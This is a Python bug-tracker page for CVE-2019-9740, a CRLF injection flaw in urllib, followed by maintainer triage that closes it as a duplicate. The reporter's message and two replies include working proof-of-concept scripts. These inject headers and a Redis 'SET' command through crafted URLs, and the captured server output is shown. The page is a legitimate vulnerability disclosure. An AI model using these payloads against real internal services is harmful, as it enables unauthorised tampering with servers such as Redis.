
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>
Issue 36276: [CVE-2019-9740] Python urllib CRLF injection vulnerability - Python tracker

</title>
<link rel="shortcut icon" href="@@file/favicon.ico" />
<link rel="stylesheet" type="text/css" href="@@file/main.css" />
<link rel="stylesheet" type="text/css" href="@@file/style.css" />
<link rel="search" type="application/opensearchdescription+xml" href="@@file/osd.xml" title="Python bug tracker search" />
<meta http-equiv="Content-Type"
      content="text/html; charset=utf-8" />

<script nonce="06ebb34a3f58214cfd52333a1920940d9f11657a074881e95d9e0d676bf00908" type="text/javascript">
submitted = false;
function submit_once() {
    if (submitted) {
        alert("Your request is being processed.\nPlease be patient.");
        return false;
    }
    submitted = true;
    return true;
}

function help_window(helpurl, width, height) {
    HelpWin = window.open('https://bugs.python.org/' + helpurl, 'RoundupHelpWindow', 'scrollbars=yes,resizable=yes,toolbar=no,height='+height+',width='+width);
    HelpWin.focus ()
}
</script>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.15/jquery-ui.js"></script>
<script type="text/javascript" src="@@file/issue.item.js"></script>
<link rel="stylesheet" type="text/css" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/smoothness/jquery-ui.css" />


</head>
<body>
  <!--  Logo  -->
  <h1 id="logoheader">
    <a accesskey="1" href="." id="logolink">
       <img src="@@file/python-logo.gif" alt="homepage" border="0" id="logo" /></a>
  </h1>

<div id="utility-menu">
<!-- Search Box -->
<div id="searchbox">
    <form name="searchform" method="get" action="issue" id="searchform">
      <div id="search">
       <input type="hidden" name="@columns"
              value="id,activity,title,creator,assignee,status,type" />
       <input type="hidden" name="@sort" value="-activity" />
       <input type="hidden" name="@filter" value="status" />
       <input type="hidden" name="@action" value="searchid" />
       <input type="hidden" name="ignore" value="file:content" />
       <input class="input-text" id="search-text"
              name="@search_text" size="10" />
       <input type="submit" id="submit" value="search" name="submit" class="input-button" />
       <input type="radio" name="status"
              id="status_notresolved" value="-1,1,3" />
       <label for="status_notresolved">open</label>
       <input type="radio" name="status" checked="checked"
              id="status_all" value="-1,1,2,3" />
       <label for="status_all">all</label>
      </div>
     </form>
</div>
</div>


<div id="left-hand-navigation">
<!--  Main Menu NEED LEVEL TWO HEADER AND FOOTER -->
<div id="menu">
  <ul class="level-one">
    <li><a href="https://www.python.org/" title="Go to the Python homepage">Python Home</a></li>
    <li><a href="https://www.python.org/about/" title="About The Python Language">About</a></li>
    <li><a href="https://www.python.org/blogs/" title="">News</a></li>
    <li><a href="https://www.python.org/doc/" title="">Documentation</a></li>
    <li><a href="https://www.python.org/downloads/" title="">Downloads</a></li>
    <li><a href="https://www.python.org/community/" title="">Community</a></li>
    <li><a href="https://www.python.org/psf/" title="Python Software Foundation">Foundation</a></li>
    <li><a href="https://devguide.python.org/" title="Python Developer's Guide">Developer's Guide</a></li>
    <li class="selected"><a href="." class="selected" title="Python Issue Tracker">Issue Tracker</a>
      <ul class="level-two">
        <li>
          <strong>Issues</strong>
          <ul class="level-three">
            
            <li><a href="issue?@template=search&amp;status=1">Search</a></li>
            <li><a href="issue?@action=random">Random Issue</a></li>
            <li>
              <form method="post" action="issue36276">
                <input type="submit" class="form-small"
                       value="Show issue:" />
                <input class="form-small" size="4" type="text" name="@number" />
                <input type="hidden" name="@type" value="issue" />
                <input type="hidden" name="@action" value="show" />
              </form>
            </li>
          </ul>
        </li>


        <li>
          <strong>Summaries</strong>
          <ul class="level-three">
            

            

            

            <li>
              <a href="issue?status=1&amp;@sort=-activity&amp;@columns=id%2Cactivity%2Ctitle%2Ccreator%2Cstatus&amp;@dispname=Issues%20with%20patch&amp;@startwith=0&amp;@group=priority&amp;keywords=2&amp;@action=search&amp;@filter=&amp;@pagesize=50">Issues with patch</a>
            </li>

            <li>
              <a href="issue?status=1&amp;@sort=-activity&amp;@columns=id%2Cactivity%2Ctitle%2Ccreator%2Cstatus&amp;@dispname=Easy%20issues&amp;@startwith=0&amp;@group=priority&amp;keywords=6&amp;@action=search&amp;@filter=&amp;@pagesize=50">Easy issues</a>
            </li>

            <li>
              <a href="issue?@template=stats">Stats</a>
            </li>

          </ul>
        </li>


        <li>
          <strong>User</strong>
          <form method="post" action="issue36276">
          <ul class="level-three">
            <li>
                Login&nbsp;(OpenID&nbsp;possible)<br />
	         <a style="display:inline;width:0;margin:0"
             href="issue36276?@action=oic_login&amp;provider=Google">
                  <img hspace="0" vspace="0" width="16"
                       height="16"
                       src="https://www.google.com/favicon.ico"
                       alt="Google" title="Google" /></a>
	         <a style="display:inline;width:0;margin:0"
             href="issue36276?@action=oic_login&amp;provider=GitHub">
                  <img hspace="0" vspace="0" width="16"
                       height="16"
                       src="https://www.github.com/favicon.ico"
                       alt="GitHub" title="GitHub" /></a>
	         <a style="display:inline;width:0;margin:0"
             href="issue36276?@action=openid_login&amp;provider=Launchpad">
                  <img hspace="0" vspace="0" width="16"
                       height="16"
                       src="https://launchpad.net/favicon.ico"
                       alt="Launchpad" title="Launchpad" /></a>
                <input size="10" name="openid_identifier" style="background:url(@@file/openid-16x16.gif)
                  center left no-repeat;padding-left:16px" /><br />
                <input size="10" type="password" name="__login_password" /><br />
                <input type="hidden" name="@action" value="Login" />
                <input type="checkbox" name="remember" id="remember" />
                <label for="remember">Remember me?</label><br />
                <input class="form-small" type="submit"
                       value="Login" /><br />
                <input type="hidden" name="__came_from"
                       value="https://bugs.python.org/issue36276?">
                
                <input type="hidden" name="@sort" value=""/>
<input type="hidden" name="@group" value=""/>
<input type="hidden" name="@pagesize" value="50"/>
<input type="hidden" name="@startwith" value="0"/>
            </li>
            <li>
                <a href="user?@template=register">Register</a>
            </li>
            <li><a href="user?@template=forgotten">Lost&nbsp;your&nbsp;login?</a></li>
          </ul>
          </form>
        </li>

        

        

        <li>
          <strong>Administration</strong>
          <ul class="level-three">
            
            <li>
                <a href="user?@sort=username">User List</a></li>
            <li>
                <a href="user?iscommitter=1&amp;@action=search&amp;@sort=username&amp;@pagesize=300">Committer List</a></li>
            
            
            
          </ul>
        </li>

        <li>
          <strong>Help</strong>
          <ul class="level-three">
            <li><a href="http://docs.python.org/devguide/triaging.html">
                Tracker Documentation</a></li>
            <li><a href="http://wiki.python.org/moin/TrackerDevelopment">
                Tracker Development</a></li>
            <li><a href="https://github.com/python/psf-infra-meta/issues">
                Report Tracker Problem</a></li>
          </ul>
        </li>

      </ul>
    </li>
  </ul>
</div> <!-- menu -->
</div> <!-- left-hand-navigation -->

<div id="content-body">
<div id="body-main">
<div id="content">
<div id="breadcrumb">
 
 
 Issue36276
 
</div>
 
 





<div>

<form method="post" name="itemSynopsis"
      onsubmit="return submit_once()"
      enctype="multipart/form-data" action="issue36276">

<fieldset><legend>classification</legend>
<table class="form">
<tr>
 <th class="required"><a href="http://docs.python.org/devguide/triaging.html#title" target="_blank">Title</a>:</th>
 
 <td colspan="3">
  <span>[CVE-2019-9740] Python urllib CRLF injection vulnerability</span>
  <input type="hidden" name="title"
         value="[CVE-2019-9740] Python urllib CRLF injection vulnerability">
 </td>
</tr>

<tr>
 <th class="required"><a href="http://docs.python.org/devguide/triaging.html#type" target="_blank">Type</a>:</th>
 <td>security</td>
 <th><a href="http://docs.python.org/devguide/triaging.html#stage" target="_blank">Stage</a>:</th>
 <td>resolved</td>
</tr>

<tr>
 <th><a href="http://docs.python.org/devguide/triaging.html#components" target="_blank">Components</a>:</th>
 <td>Library (Lib)</td>
 <th><a href="http://docs.python.org/devguide/triaging.html#versions" target="_blank">Versions</a>:</th>
 <td>Python 3.8, Python 3.7, Python 2.7</td>
</tr>
</table>
</fieldset>

<fieldset><legend>process</legend>
<table class="form">
<tr>
  <th><a href="http://docs.python.org/devguide/triaging.html#status" target="_blank">Status</a>:</th>
  <td>closed</td>
  <th><a href="http://docs.python.org/devguide/triaging.html#resolution" target="_blank">Resolution</a>:</th>
  <td>duplicate</td>
</tr>

<tr>
 <th>
    <a href="http://docs.python.org/devguide/triaging.html#dependencies"
       target="_blank">Dependencies</a>:
 </th>
 <td>
  
  
 </td>
 <th><a href="http://docs.python.org/devguide/triaging.html#superseder" target="_blank">Superseder</a>:</th>
 <td>
  [security][CVE-2019-9740][CVE-2019-9947] HTTP Header Injection (follow-up of CVE-2016-5699)
 <span>
<!--   <br><span i18n:translate="">View</span>:
     <a tal:repeat="sup context/superseder"
        tal:content="python:sup['id'] + ', '*(not repeat['sup'].end)"
        tal:attributes="href string:issue${sup/id}; title sup/title;"></a> -->
   <br>View:
     <a href="issue30458" class="closed"
        title="[security][CVE-2019-9740][CVE-2019-9947] HTTP Header Injection (follow-up of CVE-2016-5699)">30458</a>
  </span>
 </td>
 </tr>
 <tr>
 <th>
   <a href="http://docs.python.org/devguide/triaging.html#assigned-to"
      target="_blank">Assigned To</a>:
 </th>
 
 <td>
  orsenthil
 </td>
 <th>
   <a href="http://docs.python.org/devguide/triaging.html#nosy-list"
      target="_blank">Nosy List</a><!--
        <span tal:condition="context/nosy_count" tal:replace="python: ' (%d)' % context.nosy_count" /> -->:
 </th>
 <td>
     alvinchang, brett.cannon, cstratak, martin.panter, orsenthil, ragdoll.guo, vstinner, xtreak
     
 </td>
</tr>
<tr>
 <th>
   <a href="http://docs.python.org/devguide/triaging.html#priority"
      target="_blank">Priority</a>:
 </th>
 <td>normal</td>
 <th>
    <a href="http://docs.python.org/devguide/triaging.html#keywords"
       target="_blank">Keywords</a>:
 </th>
 <td></td>


</tr>









</table>
</fieldset>

</form>

<p>Created on <strong>2019-03-13 01:26</strong> by <strong>ragdoll.guo</strong>, last changed <strong>2019-04-10 00:39</strong> by <strong>gregory.p.smith</strong>. This issue is now <strong style="color:#00F; background-color:inherit;">closed</strong>.</p>

<table class="files">
 <tr><th colspan="5" class="header">Files</th></tr>
 <tr>
  <th>File name</th>
  <th>Uploaded</th>
  <th>Description</th>
  <th>Edit</th>
 </tr>
 <tr>
  <td>
   <a href="file48206/python-urllib-CRLF-injection-vulnerability.pdf">python-urllib-CRLF-injection-vulnerability.pdf</a>
  </td>
  <td>
   <span>ragdoll.guo</span>,
   <span>2019-03-13 01:26</span>
  </td>
  <td>Vulnerability details</td>
  <td>
      
      
      
  </td>
 </tr>
</table>

<table class="files">
 <tr><th class="header" colspan="4">Pull Requests</th></tr>
 <tr>
  <th>URL</th>
  <th>Status</th>
  <th>Linked</th>
  <th>Edit</th>
 </tr>
 <tr>
  <td><a href="https://github.com/python/cpython/pull/12755" title="bpo-30458: Disallow control chars in http URLs.">PR 12755</a></td>
  <td>merged</td>
  <td>
   <span>gregory.p.smith</span>,
   <span>2019-04-10 00:39</span>
  </td>
  <td>
    
  </td>
 </tr>
</table>





<table class="messages">
 <tr><th colspan="4" class="header">Messages (11)</th></tr>
 
  <tr>
    <th>
     <a href="#msg337827" id="msg337827">msg337827</a> - <a
    href="msg337827">(view)</a></th>
   <th>Author: ragdoll (ragdoll.guo)</th>
   <th>Date: 2019-03-13 01:26</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>Abstract:
A CRLF injection vulnerability of Python built-in urllib module (“urllib2” in 2.x，”urllib” in 3.x) was found by our team. Attacker who has the control of the requesting address parameter, could exploit this vulnerability to manipulate a HTTP header and attack an internal service, like a normal Webserver, Memcached, Redis and so on.

Principles:
The current implementation of urllib does not encode the ‘\r\n’ sequence in the query string, which allowed the attacker to manipulate a HTTP header with the ‘\r\n’ sequence in it, so the attacker could insert arbitrary content to the new line of the HTTP header. 

Proof of Concept:
Consider the following Python3 script:

#!/usr/bin/env python3

import sys
import urllib
import urllib.error
import urllib.request

host = "10.251.0.83:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"
url = "http://" + host + ":8080/test/?test=a"

try:
    info = urllib.request.urlopen(url).info()
    print(info)
except urllib.error.URLError as e:
    print(e)
#end

In this script, the host parameter usually could be controlled by user, and the content of host above is exactly the payload. We setup a server using nc to open a 7777 port and to receive and display the HTTP request data from client , then run the code above on a client to sent a HTTP request to the server.

# nc -l -p 7777
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123:8080/test/?test=a HTTP/1.1
Accept-Encoding: identity
Host: 10.251.0.83:7777
User-Agent: Python-urllib/3.7
Connection: close


#end
As you can see in the picture above , the nc server displayed the HTTP request with a manipulated header content:” X-injected:header”, which means we successfully injected the HTTP header. In order to make the injected header available, we have to add an extra ‘\r\n’ after the new header, so we add another parameter to contain the original parameter data, like ‘TEST’ in above sample.

Attack Scenarios
1. By crafting HTTP headers, it’s possible to fool some web services;
2. It’s also possible to attack several simple services like Redis, memcached.
Let’s take Redis as a example here:
Adapt the script above to this:
#!/usr/bin/env python3

import sys
import urllib
import urllib.error
import urllib.request

host = "10.251.0.83:6379?\r\nSET test success\r\n"
url = "http://" + host + ":8080/test/?test=a"

try:
    info = urllib.request.urlopen(url).info()
    print(info)
except urllib.error.URLError as e:
    print(e)
#end
We changed the injected header to a valid redis command, after executing this, we check the redis server:
127.0.0.1:6379&gt; GET test
"success"
127.0.0.1:6379&gt; 
We can see that a “test” key was inserted successfully.

Conclusion:
The implementation of parameter handling of urllib is vulnerable, which allows attacker to manipulate the HTTP header. Attacker who has ability to take control of the requesting address parameter of this library, could exploit this vulnerability to manipulate a HTTP header and attack an internal host like a normal Webserver, Memcached, Redis and so on.</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg337829" id="msg337829">msg337829</a> - <a
    href="msg337829">(view)</a></th>
   <th>Author: Karthikeyan Singaravelan (xtreak) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-03-13 02:19</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>See also <a href="https://bugs.python.org/issue30458#msg295067">https://bugs.python.org/issue30458#msg295067</a></pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg337837" id="msg337837">msg337837</a> - <a
    href="msg337837">(view)</a></th>
   <th>Author: Alvin Chang (alvinchang)</th>
   <th>Date: 2019-03-13 06:05</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>I am also seeing the same issue with urllib3 

import urllib3

pool_manager = urllib3.PoolManager()

host = "localhost:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"
url = "http://" + host + ":8080/test/?test=a"

try:
    info = pool_manager.request('GET', url).info()
    print(info)
except Exception:
    pass

nc -l localhost 7777
GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123:8080/test/?test=a HTTP/1.1
Host: localhost:7777
Accept-Encoding: identity</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg337878" id="msg337878">msg337878</a> - <a
    href="msg337878">(view)</a></th>
   <th>Author: Brett Cannon (brett.cannon) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-03-13 22:00</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>And security issues should be reported according to <a href="https://www.python.org/news/security/">https://www.python.org/news/security/</a> .</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg337910" id="msg337910">msg337910</a> - <a
    href="msg337910">(view)</a></th>
   <th>Author: Senthil Kumaran (orsenthil) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-03-14 11:50</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>Thanks for this report. Should we make this a duplicate of this <a class="closed" title="[closed] [security][CVE-2019-9740][CVE-2019-9947] HTTP Header Injection (follow-up of CVE-2016-5699)" href="issue30458">issue30458</a> - as they are both referring to the same problem with the underlying library?</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg337953" id="msg337953">msg337953</a> - <a
    href="msg337953">(view)</a></th>
   <th>Author: Brett Cannon (brett.cannon) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-03-14 17:23</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>Yep, if it's the same problem then close this as a dupe and just poke the other issue.</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg337961" id="msg337961">msg337961</a> - <a
    href="msg337961">(view)</a></th>
   <th>Author: ragdoll (ragdoll.guo)</th>
   <th>Date: 2019-03-15 01:19</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>OK</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg337968" id="msg337968">msg337968</a> - <a
    href="msg337968">(view)</a></th>
   <th>Author: Karthikeyan Singaravelan (xtreak) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-03-15 06:03</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>For reference an exact report on golang repo : <a href="https://github.com/golang/go/issues/30794">https://github.com/golang/go/issues/30794</a> . This seemed to have been fixed in latest golang release 1.12 and commit <a href="https://github.com/golang/go/commit/829c5df58694b3345cb5ea41206783c8ccf5c3ca">https://github.com/golang/go/commit/829c5df58694b3345cb5ea41206783c8ccf5c3ca</a> . The commit introduces a check for CTL characters and throws an error for URLs something similar to Python does for headers now at <a href="https://hg.python.org/lookup/bf3e1c9b80e9">bf3e1c9b80e9</a>.

func isCTL(r rune) bool {
	return r &lt; ' ' || 0x7f &lt;= r &amp;&amp; r &lt;= 0x9f
}

if strings.IndexFunc(ruri, isCTL) != -1 {
	return errors.New("net/http: can't write control character in Request.URL")
}

So below program used to work before go 1.12 setting a key on Redis but now it throws error : 

package main

import "fmt"
import "net/http"

func main() {
	resp, err := http.Get("<a href="http://127.0.0.1:6379">http://127.0.0.1:6379</a>?\r\nSET test failure12\r\n:8080/test/?test=a")
	fmt.Println(resp)
	fmt.Println(err)
}


➜  go version
go version go1.12 darwin/amd64
➜  go run urllib_vulnerability.go
&lt;nil&gt;
parse <a href="http://127.0.0.1:6379">http://127.0.0.1:6379</a>?
SET test failure12
:8080/test/?test=a: net/url: invalid control character in URL

Looking more into the commit there seemed to be a solution towards escaping characters with <a href="https://github.com/golang/go/issues/22907">https://github.com/golang/go/issues/22907</a> . The fix seemed to have broke Google's internal tests [0] and hence reverted to have the above commit where only CTL characters were checked and raises an error. I think this is a tricky bug upon reading code reviews in the golang repo that has around 2-3 reports with a fix committed to be reverted later for a more conservative fix and the issue was reopened to target go 1.13 .

Thanks a lot for the report @ragdoll.guo

[0] <a href="https://go-review.googlesource.com/c/go/+/159157/2#message-39c6be13a192bf760f6318ac641b432a6ab8fdc8">https://go-review.googlesource.com/c/go/+/159157/2#message-39c6be13a192bf760f6318ac641b432a6ab8fdc8</a></pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg338099" id="msg338099">msg338099</a> - <a
    href="msg338099">(view)</a></th>
   <th>Author: Senthil Kumaran (orsenthil) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-03-16 20:54</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>Marking this as duplicate of <a class="closed" title="[closed] [security][CVE-2019-9740][CVE-2019-9947] HTTP Header Injection (follow-up of CVE-2016-5699)" href="issue30458">issue30458</a>.

Thanks for the discussion.</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg338441" id="msg338441">msg338441</a> - <a
    href="msg338441">(view)</a></th>
   <th>Author: Senthil Kumaran (orsenthil) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-03-20 06:14</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>I am going to make a note that the Superseder

1) <a href="https://bugs.python.org/issue30458">https://bugs.python.org/issue30458</a> - is listed only as pending request for 2.7 with the intention to raise an Exception.

However, this bug demonstrates a vulnerability in all versions of Python (including 3.8 as of March 2019).

There are additional related bug reports that deal with the same topic of parsing CRLF in headers / or in requests.

2) <a href="https://bugs.python.org/issue14826">https://bugs.python.org/issue14826</a> 
3) <a href="https://bugs.python.org/issue13359">https://bugs.python.org/issue13359</a>

A consolidation of all of these is required, and at the end, our goal should be the close the loophole reported by this bug.


I am assigning this bug to myself to work on it, and my first task is make sure that the previous reports 1, 2 and 3 cover the scenario mentioned in this report. If they do not, I will reopen this ticket.

Thanks!</pre>
   </td>
  </tr>
 
 
  <tr>
    <th>
     <a href="#msg339753" id="msg339753">msg339753</a> - <a
    href="msg339753">(view)</a></th>
   <th>Author: STINNER Victor (vstinner) <span title="Contributor form received">*</span> <img src="@@file/committer.png" title="Python committer" alt="(Python committer)" /></th>
   <th>Date: 2019-04-09 14:27</th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    
    <pre>The CVE-2019-9740 has been assigned to this issue:

* <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9740">https://nvd.nist.gov/vuln/detail/CVE-2019-9740</a>
* <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1692984">https://bugzilla.redhat.com/show_bug.cgi?id=1692984</a>

... which has been marked as a duplicate of <a class="closed" title="[closed] [security][CVE-2019-9740][CVE-2019-9947] HTTP Header Injection (follow-up of CVE-2016-5699)" href="issue30458">bpo-30458</a>.</pre>
   </td>
  </tr>
 
</table>

<table class="history table table-condensed table-striped"><tr><th colspan="4" class="header">
History
</th></tr><tr>
<th>Date</th>
<th>User</th>
<th>Action</th>
<th>Args</th>
</tr>
<tr><td>2019-04-10&nbsp;00:39:59</td><td>gregory.p.smith</td><td>set</td><td>pull_requests:
  + <a rel="nofollow" href="pull_request12683">pull_request12683</a></td></tr>
<tr><td>2019-04-09&nbsp;14:27:02</td><td>vstinner</td><td>set</td><td>messages:
  + <a rel="nofollow" href="msg339753">msg339753</a><br />title: Python urllib CRLF injection vulnerability -> [CVE-2019-9740] Python urllib CRLF injection vulnerability</td></tr>
<tr><td>2019-03-26&nbsp;21:44:25</td><td>cstratak</td><td>set</td><td>nosy:
  + <a rel="nofollow" href="user23615">cstratak</a><br /></td></tr>
<tr><td>2019-03-20&nbsp;06:14:57</td><td>orsenthil</td><td>set</td><td>assignee: <a rel="nofollow" href="user1741">orsenthil</a><br />messages:
  + <a rel="nofollow" href="msg338441">msg338441</a></td></tr>
<tr><td>2019-03-17&nbsp;08:52:59</td><td>xtreak</td><td>set</td><td>superseder: <a rel="nofollow" href="issue30458">[security][CVE-2019-9740][CVE-2019-9947] HTTP Header Injection (follow-up of CVE-2016-5699)</a></td></tr>
<tr><td>2019-03-16&nbsp;20:54:02</td><td>orsenthil</td><td>set</td><td>status: open -> closed<br />resolution: duplicate<br />messages:
  + <a rel="nofollow" href="msg338099">msg338099</a><br /><br />stage: resolved</td></tr>
<tr><td>2019-03-15&nbsp;06:03:18</td><td>xtreak</td><td>set</td><td>messages:
  + <a rel="nofollow" href="msg337968">msg337968</a></td></tr>
<tr><td>2019-03-15&nbsp;01:19:31</td><td>ragdoll.guo</td><td>set</td><td>messages:
  + <a rel="nofollow" href="msg337961">msg337961</a></td></tr>
<tr><td>2019-03-14&nbsp;17:23:20</td><td>brett.cannon</td><td>set</td><td>messages:
  + <a rel="nofollow" href="msg337953">msg337953</a></td></tr>
<tr><td>2019-03-14&nbsp;11:50:48</td><td>orsenthil</td><td>set</td><td>messages:
  + <a rel="nofollow" href="msg337910">msg337910</a></td></tr>
<tr><td>2019-03-13&nbsp;22:00:52</td><td>brett.cannon</td><td>set</td><td>nosy:
  + <a rel="nofollow" href="user37">brett.cannon</a><br />messages:
  + <a rel="nofollow" href="msg337878">msg337878</a><br /></td></tr>
<tr><td>2019-03-13&nbsp;07:38:38</td><td>xtreak</td><td>set</td><td>nosy:
  + <a rel="nofollow" href="user2377">vstinner</a><br /></td></tr>
<tr><td>2019-03-13&nbsp;06:05:54</td><td>alvinchang</td><td>set</td><td>nosy:
  + <a rel="nofollow" href="user30835">alvinchang</a><br />messages:
  + <a rel="nofollow" href="msg337837">msg337837</a><br /></td></tr>
<tr><td>2019-03-13&nbsp;02:19:43</td><td>xtreak</td><td>set</td><td>nosy:
  + <a rel="nofollow" href="user14751">martin.panter</a>, <a rel="nofollow" href="user28746">xtreak</a>, <a rel="nofollow" href="user1741">orsenthil</a><br />messages:
  + <a rel="nofollow" href="msg337829">msg337829</a><br /></td></tr>
<tr><td>2019-03-13&nbsp;01:26:51</td><td>ragdoll.guo</td><td>create</td><td></td></tr>
</table>

</div>


</div> <!-- content-body -->
<div id="footer">
<div id="credits">
  Hosted on <a href="https://m.do.co/c/783434964889" title="Hosted on DigitalOcean">DigitalOcean</a>,
  <br>
  Supported by <a href="https://python.org/psf-landing/" title="The Python Software Foundation">The Python Software Foundation</a>,
  <br>
  Powered by <a href="http://roundup.sourceforge.net" title="Powered by the Roundup Issue Tracker">Roundup</a>
</div> <!-- credits -->
Copyright &copy; 1990-2020, <a href="http://python.org/psf">Python Software Foundation</a><br />
<a href="http://python.org/about/legal">Legal Statements</a>
</div> <!-- footer -->
</div> <!-- body-main -->
</div> <!-- content -->



</body>
</html>

